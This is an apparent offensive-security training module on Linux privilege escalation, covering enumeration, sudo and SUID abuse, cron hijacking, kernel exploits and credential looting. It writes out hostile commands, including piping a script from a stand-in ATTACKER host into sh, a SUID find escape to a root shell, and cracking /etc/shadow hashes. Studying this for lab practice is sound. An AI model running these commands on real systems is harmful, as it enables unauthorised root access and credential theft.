# Domain 09 · Linux Exploitation & Privilege Escalation

> Module 10. Land on Linux, become `root`. Linux hosts are everywhere on the range (web servers, jump boxes, IoT gateways, OT bridges).

## Why it matters

A huge share of footholds are Linux (web app RCE, SSH, services). Root unlocks credential loot, network position for pivoting, and the flags. Linux privesc is largely **systematic enumeration** — the path is almost always sitting in the output if you read it.

## Privilege-escalation categories

| Category | Look for | Exploit |
|---|---|---|
| **sudo misconfig** | `sudo -l` (NOPASSWD, specific binaries) | run allowed binary as root; **GTFOBins** escapes |
| **SUID/SGID** | `find / -perm -4000 2>/dev/null` | abuse SUID binary (GTFOBins) |
| **Capabilities** | `getcap -r / 2>/dev/null` | e.g., `cap_setuid` on python/perl |
| **Cron jobs** | `/etc/cron*`, writable scripts | hijack a root-run script |
| **Writable files** | writable `/etc/passwd`, `/etc/shadow`, service units | add root user / edit |
| **PATH / wildcard** | scripts calling binaries by relative name; `tar`/`rsync` wildcards | inject malicious binary/args |
| **NFS** | `no_root_squash` exports | drop SUID binary from attacker as root |
| **Docker/LXD group** | user in `docker`/`lxd` group | mount host / privileged container escape |
| **Kernel exploits** | old kernel (`uname -a`) | DirtyCow, DirtyPipe, PwnKit (last resort) |
| **Creds** | history, config, `.env`, keys, DB creds | reuse / lateral |

## Methodology / workflow

1. **Stabilize the shell** (`python3 -c 'import pty;pty.spawn("/bin/bash")'`, `stty raw -echo`, set `TERM`).
2. **Manual quick wins:** `id`, `sudo -l`, `uname -a`, SUID find, `cat` interesting files, history, `ip route`.
3. **Automated enum:** **LinPEAS** (and `linux-exploit-suggester`), read critically.
4. **Choose the least risky vector** (sudo/SUID/cap/cron before kernel).
5. **Escalate**, then **loot**: creds, keys, `/etc/shadow` (crack with John), network info for pivoting.

## Tools & usage

| Tool | Purpose |
|---|---|
| **LinPEAS** | comprehensive privesc enumeration |
| **linux-exploit-suggester** | map kernel/userland to known exploits |
| **pspy** | watch processes/cron without root (catch root-run jobs) |
| **GTFOBins** (reference) | how to break out of a given binary |
| **John / hashcat** | crack `/etc/shadow` hashes (`unshadow`) |

## Commands (quick)

```bash
# Recon
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null         # SUID
getcap -r / 2>/dev/null                          # capabilities
grep -rniE 'password|api[_-]?key|secret' /var/www 2>/dev/null
# Automated
curl http://ATTACKER/linpeas.sh | sh
./pspy64                                         # spot root cron
# Crack recovered hashes
unshadow passwd shadow > h ; john --wordlist=rockyou.txt h
```

### Example: passwordless sudo (most common)
```bash
sudo -l                 # (ALL : ALL) NOPASSWD: ALL
sudo su -               # instant root
```
### Example: SUID GTFOBins escape
```bash
# if /usr/bin/find is SUID:
find . -exec /bin/sh -p \; -quit
```

## Common pitfalls

- Not stabilizing the shell first (you'll fight a dumb shell the whole time).
- Skipping `sudo -l` / SUID — the answer is usually right there.
- Reaching for kernel exploits first (libc/compile mismatches on old targets are common — keep precompiled binaries that match the target).
- Forgetting to loot creds/keys before pivoting.

## Exam relevance

Fast, reliable Linux privesc on every foothold; the loot (SSH keys, passwords, `/etc/shadow`) feeds pivoting and lateral movement across subnets.

## MITRE / mapping

- `T1548.003` (Sudo/Sudo Caching), `T1548.001` (SUID), `T1053.003` (Cron), `T1068` (Kernel exploit), `T1552` (Unsecured Credentials).

## Practice

- HTB Academy **Linux Privilege Escalation**; TryHackMe Linux PrivEsc/Arena; Proving Grounds Linux boxes.
- Reproduce each category once in a lab VM.

## Self-check

- [ ] I stabilize a reverse shell reflexively.
- [ ] I can exploit sudo, SUID, capabilities, cron, and a writable file by hand.
- [ ] I crack `/etc/shadow` and reuse creds across hosts.
